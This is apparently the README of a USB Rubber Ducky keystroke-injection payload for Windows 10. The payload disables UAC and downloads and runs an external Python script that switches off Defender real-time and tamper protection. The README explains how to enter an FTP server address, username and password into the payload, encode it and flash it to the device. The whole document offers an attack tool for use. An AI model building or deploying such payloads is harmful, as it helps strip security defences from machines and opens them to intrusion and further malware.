-----------------------------------------------------
# Rubber Ducky UAC and AV deactivation script


REM Title:         Disable_UAC_and_AV
REM Description    Disable UAC and download py script to disable Realtime and tamper protection
REM Author:        FX17
REM Version:       1.0
REM Target:        Windows 10
REM Attackmodes:   HID

This ducky script will download and run the following Python script: https://github.com/Keiranos/AVDeact

Be sure to edit the .txt file lines 96, 99 and 102.

For example the script should look like:
96: `STRING 192.168.0.69 21`
99: `STRING FX17`
102: `STRING SecurePassword123!`

After these changes encode the script and upload to your ducky!

If you have any issues running this script, please contact me via discord: @Keiran1712

-----------------------------------------------------
